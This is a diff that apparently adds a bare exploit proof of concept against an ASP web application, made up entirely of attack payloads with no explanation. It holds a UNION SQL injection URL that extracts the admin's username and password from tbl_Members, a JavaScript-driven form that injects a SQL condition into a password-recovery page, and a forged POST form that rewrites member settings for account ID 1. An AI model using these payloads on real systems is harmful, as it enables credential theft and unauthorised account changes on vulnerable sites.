@@ -1,0 +1,54 @@
+http://www.example.com/events.asp?ID=-1 union all select 1,1,1,'Username= '%2bmember_name%2b'<br>Password=
+'%2bmember_password,1,1,1,1,1,1,1 from tbl_Members where member_name = 'admin'
+
+<script language="javascript">
+                        function check(){
+                                document.getElementById("UserName").value = "1' or uCase(Member_Name)='"+ document.getElementById("UserName").value
+                        }
+                </script>
+                <form action="http://www.example.com/getpassword.asp" method="post" onsubmit="check()">
+                UserName: <input type="text" name="UserName" id="UserName" value="default" size="100" />
+                <br />
+                EMail: <input type="text" name="EMail" value="Your Email Address" size="100" />
+                <br />
+                <input type="submit" />
+                </form>
+        -------------
+
+ <form action="http://www.example.com/option_Update.asp?Action=edit" method="post">
+                ID<input type="text" name="ID" value="1"/>
+                <br />
+                Member_Cookies<input type="text" name="Member_Cookies" value="Yes" />
+                <br />
+                Member_SystemCookies<input type="text" name="Member_SystemCookies" value="Yes" />
+                <br />
+                Member_Center<input type="text" name="Member_Center" value="1" />
+                <br />
+                Member_EmailTheadResponse<input type="text" name="Member_EmailTheadResponse" value="1" />
+                <br />
+                Member_EmailPostResponse<input type="text" name="Member_EmailPostResponse" value="1" />
+                <br />
+                Member_WeekStart<input type="text" name="Member_WeekStart" value="0" />
+                <br />
+                Member_ThreadDays<input type="text" name="Member_ThreadDays" value="0" />
+                <br />
+                Member_ThreadView<input type="text" name="Member_ThreadView" value="0" />
+                <br />
+                Member_Invisible<input type="text" name="Member_Invisible" value="1" />
+                <br />
+                Member_HiddenEmail<input type="text" name="Member_HiddenEmail" value="0" />
+                <br />
+                Member_ReceivePM<input type="text" name="Member_ReceivePM" value="1" />
+                <br />
+                Member_PMEmailNotice<input type="text" name="Member_PMEmailNotice" value="1" />
+                <br />
+                Member_PMPopup<input type="text" name="Member_PMPopup" value="1" />
+                <br />
+                Member_Newsletter<input type="text" name="Member_Newsletter" value="0" />
+                <br />
+                Member_TimeZone<input type="text" name="Member_TimeZone" value="0" />
+                <br />
+                Member_DefaultColor<input type="text" name="Member_DefaultColor" value="1" />
+                <br />
+                <input type="submit" />
+                </form>
